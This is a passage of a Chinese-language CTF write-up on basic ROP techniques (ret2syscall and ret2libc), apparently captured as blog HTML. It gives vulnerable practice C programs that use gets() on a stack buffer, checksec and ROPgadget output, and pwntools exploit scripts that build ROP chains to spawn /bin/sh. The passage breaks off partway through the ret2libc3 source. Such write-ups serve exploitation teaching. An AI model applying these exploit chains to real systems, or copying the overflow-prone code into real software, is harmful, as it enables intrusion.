+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@gnq:~/test$ ROPgadget --binary rop --only <span class="s1">&#39;int&#39;</span>
+</span></span><span class="line"><span class="cl">Gadgets <span class="nv">information</span>
+</span></span><span class="line"><span class="cl"><span class="o">============================================================</span>
+</span></span><span class="line"><span class="cl">0x08049421 : int 0x80
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Unique gadgets found: <span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据系统调用顺序编写攻击脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./rop&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_eax_ret</span><span class="o">=</span><span class="mh">0x080bb196</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span><span class="o">=</span><span class="mh">0x0806eb90</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_addr</span><span class="o">=</span><span class="mh">0x080be408</span>
+</span></span><span class="line"><span class="cl"><span class="n">int0x80_addr</span><span class="o">=</span><span class="mh">0x08049421</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">112</span> <span class="c1">#padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">int0x80_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对应栈分步图</p>
+<p><img
+        class="lazyload"
+        data-src="/BasicROP.assets/ret2syscall.png"
+        data-srcset="/BasicROP.assets/ret2syscall.png, /BasicROP.assets/ret2syscall.png 1.5x, /BasicROP.assets/ret2syscall.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/ret2syscall.png"
+        title="/BasicROP.assets/ret2syscall.png"></p>
+<h2 id="ret2libc" class="headerLink">
+    <a href="#ret2libc" class="header-mark"></a>ret2libc</h2><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(&quot;/bin/sh&quot;)，故而此时我们需要知道 system 函数的地址。</p>
+<h3 id="ret2libc1" class="headerLink">
+    <a href="#ret2libc1" class="header-mark"></a>ret2libc1</h3><p>例题一，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1" target="_blank" rel="noopener noreffer">题目地址</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">secure</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">secretcode</span><span class="p">,</span> <span class="n">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">secretcode</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">secretcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;shell!?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;RET2LIBC &gt;_&lt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gets</span><span class="p">(</span><span class="n">buf1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看保护，开启了NX保护</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@gnq:~/test$ checksec ret2libc1 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gnq/test/ret2libc1&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用IDA看一下伪代码，依旧是gets函数导致栈溢出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-64h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;RET2LIBC &gt;_&lt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>并且该程序的plt表有system函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">.</span><span class="nl">plt</span><span class="p">:</span><span class="mi">08048460</span> <span class="n">_system</span>         <span class="n">proc</span> <span class="n">near</span>               <span class="p">;</span> <span class="n">CODE</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">secure</span><span class="o">+</span><span class="mi">44</span><span class="err">↓</span><span class="n">p</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">plt</span><span class="p">:</span><span class="mi">08048460</span>                 <span class="n">jmp</span>     <span class="nl">ds</span><span class="p">:</span><span class="n">off_804A018</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">plt</span><span class="p">:</span><span class="mi">08048460</span> <span class="n">_system</span>         <span class="n">endp</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同时程序中也有/bin/sh的地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">rodata</span><span class="p">:</span><span class="mi">08048720</span> <span class="n">aBinSh</span>          <span class="n">db</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span>          <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="p">.</span><span class="nl">data</span><span class="p">:</span><span class="n">shell</span><span class="err">↓</span><span class="n">o</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么就可以构造栈帧调用system
+<img
+        class="lazyload"
+        data-src="/BasicROP.assets/ret2libc1.png"
+        data-srcset="/BasicROP.assets/ret2libc1.png, /BasicROP.assets/ret2libc1.png 1.5x, /BasicROP.assets/ret2libc1.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/ret2libc1.png"
+        title="/BasicROP.assets/ret2libc1.png"></p>
+<p>编写攻击脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2libc1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys_plt</span><span class="o">=</span><span class="mh">0x08048460</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_addr</span><span class="o">=</span><span class="mh">0x08048720</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">112</span><span class="c1">#padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">sys_plt</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;aaaa&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ret2libc2" class="headerLink">
+    <a href="#ret2libc2" class="header-mark"></a>ret2libc2</h3><p>例题二，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc2" target="_blank" rel="noopener noreffer">题目地址</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">secure</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">secretcode</span><span class="p">,</span> <span class="n">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">secretcode</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">secretcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;no_shell_QQ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Something surprise here, but I don&#39;t think it will work.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What do you think ?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gets</span><span class="p">(</span><span class="n">buf1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>题目基本内容一致，但是程序中没有 /bin/sh 地址，但是可以在bss段中的buf2写入/bin/sh，然后作为system的参数传入来getshell</p>
+<p><img
+        class="lazyload"
+        data-src="/BasicROP.assets/ret2libc2.png"
+        data-srcset="/BasicROP.assets/ret2libc2.png, /BasicROP.assets/ret2libc2.png 1.5x, /BasicROP.assets/ret2libc2.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/ret2libc2.png"
+        title="/BasicROP.assets/ret2libc2.png"></p>
+<p>编写攻击脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2libc2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_ebx_ret</span><span class="o">=</span><span class="mh">0x0804843d</span>
+</span></span><span class="line"><span class="cl"><span class="n">gets_plt</span><span class="o">=</span><span class="mh">0x08048460</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_plt</span><span class="o">=</span><span class="mh">0x8048490</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf2_addr</span><span class="o">=</span><span class="mh">0x0804A080</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">gets_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;aaaa&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">buf2_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ret2libc3" class="headerLink">
+    <a href="#ret2libc3" class="header-mark"></a>ret2libc3</h3><p>例题二，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc3" target="_blank" rel="noopener noreffer">题目地址</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">secure</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">secretcode</span><span class="p">,</span> <span class="n">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">secretcode</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">secretcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;no_shell_QQ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;No surprise anymore, system disappeard QQ.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Can you find it !?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gets</span><span class="p">(</span><span class="n">buf1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
